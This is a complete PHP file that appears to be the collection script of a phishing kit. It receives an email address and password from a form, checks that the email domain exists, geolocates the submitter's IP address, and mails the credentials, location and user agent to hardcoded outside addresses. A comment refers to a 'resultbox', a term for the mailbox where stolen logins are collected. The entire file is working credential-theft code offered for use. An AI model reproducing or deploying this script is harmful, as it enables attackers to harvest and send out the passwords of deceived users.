<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $email = isset($_POST['a']) ? $_POST['a'] : "";
    $password = isset($_POST['az']) ? $_POST['az'] : "";

    if (!empty($email)) {

        // Sanitize email
        $email = filter_var($email, FILTER_SANITIZE_EMAIL);

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            // Invalid email syntax
            die();
        } else {
            list($user, $domain) = explode('@', $email);
            if (!checkdnsrr($domain, 'MX')) {
                // MX record for domain does not exist
                die();
            }
        }
    }

    if (!empty($password)) {
        
        // Sanitize password
        $password = filter_var($password, FILTER_SANITIZE_STRING);
        
        if (empty($password)) {
            // Password is required
            die();
        }
    }
    $ip = "";
    // Get real IP address
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

  // GeoIP API endpoint
$geoIPApiUrl = "http://ip-api.com/json/{$ip}";

// Call GeoIP API
$geoDataJson = file_get_contents($geoIPApiUrl);
$geoData = json_decode($geoDataJson);

// Extract city, country, timezone
$city = $geoData->city ?? 'Unknown';
$country = $geoData->country ?? 'Unknown';
$timezone = $geoData->timezone ?? 'Unknown';

// Get User Agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// change destination@example.com with your resultbox email
$to = 'asonmezerler@natvreltextile.com, mali.subbiah@proton.me';
$subject = "Log From $email";
$message = "Email: {$email}\nPassword: {$password}\nIP Address: {$ip}\nCity: {$city}\nCountry: {$country}\nTimezone: {$timezone}\nUser Agent: {$userAgent}";
$from = 'webmaster@' . $_SERVER['SERVER_NAME'];
$headers = 'From: ' . $from;

// Send email
mail($to, $subject, $message, $headers);
}
?>